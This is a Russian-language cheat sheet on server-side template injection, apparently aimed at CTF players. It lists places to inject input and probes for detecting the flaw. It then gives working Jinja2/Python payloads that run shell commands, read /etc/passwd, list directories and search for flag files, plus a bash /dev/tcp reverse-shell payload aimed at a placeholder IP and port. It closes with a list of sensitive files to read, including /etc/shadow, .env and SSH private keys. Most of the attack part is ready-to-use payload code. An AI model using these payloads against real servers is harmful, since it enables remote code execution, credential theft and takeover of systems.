# SSTI (Server-Side Template Injection) — инъекция шаблонов на стороне сервера

SSTI (Server-Side Template Injection) - 
Уязвимость, когда приложение подставляет пользовательский ввод в шаблоны без проверки. Атакующий может выполнять код на сервере.

Основные места для внедрения:
1. Параметры URL
http://example.com/profile?name={{7*7}}

2. Поля форм
Поисковые запросы
Формы входа/регистрации
Комментарии
Контактные формы

3. HTTP-заголовки
User-Agent
Referer
X-Forwarded-For
Cookie значения

4. API-эндпоинты
JSON/XML параметры
RESTful API параметры
GraphQL переменные

5. Файловые загрузки
Имена файлов
Метаданные файлов

6. Персональные данные профиля
Имена пользователей
Описания профилей
Настройки аккаунта


ОСНОВНЫЕ АТАКИ
1. ОБНАРУЖЕНИЕ уязвимости
Что делает: Проверяет, выполняется ли код в шаблоне

{{7*7}}    → Если видишь 49 вместо {{7*7}} → уязвимость есть
${7*7}     → Для других шаблонизаторов
<%= 7*7 %> → Для ERB (Ruby)

2. ЧТЕНИЕ ФАЙЛОВ (основные способы)
Что делает: Читает содержимое файлов на сервере
Пример 1 - Через os.popen:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}

Пример 2 - Через open():
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}

Пример 3 - Через config:
{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}

3. ПРОСМОТР КАТАЛОГОВ (листинг файлов)
Что делает: Показывает файлы в директориях
Пример 1 - Текущая директория:
{{ ''.__class__.__mro__[1].__subclasses__()[258]('ls -la', shell=True, stdout=-1).communicate()[0] }}
Пример 2 - Через os.listdir:
{{ self.__init__.__globals__.__builtins__.__import__('os').listdir('.') }}

4. ПОИСК ИНТЕРЕСНЫХ ФАЙЛОВ
Что делает: Ищет файлы с флагами, секретами и т.д.
Пример - Поиск флага:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name "*flag*" 2>/dev/null').read() }}

5. ВЫПОЛНЕНИЕ КОМАНД (RCE)
Что делает: Выполняет произвольные команды на сервере
Пример - Reverse shell:
{{ ''.__class__.__mro__[1].__subclasses__()[258]('bash -c "bash -i >& /dev/tcp/АЙПИ/ПОРТ 0>&1"', shell=True) }}

ВАЖНЫЕ ФАЙЛЫ ДЛЯ ЧТЕНИЯ
1. /etc/passwd          - Пользователи системы
2. /etc/shadow          - Хеши паролей
3. /flag или flag.txt   - Часто в CTF
4. .env                 - Переменные окружения приложения
5. app.py               - Исходный код
6. /proc/self/environ   - Переменные окружения процесса
7. ~/.ssh/id_rsa        - SSH ключи
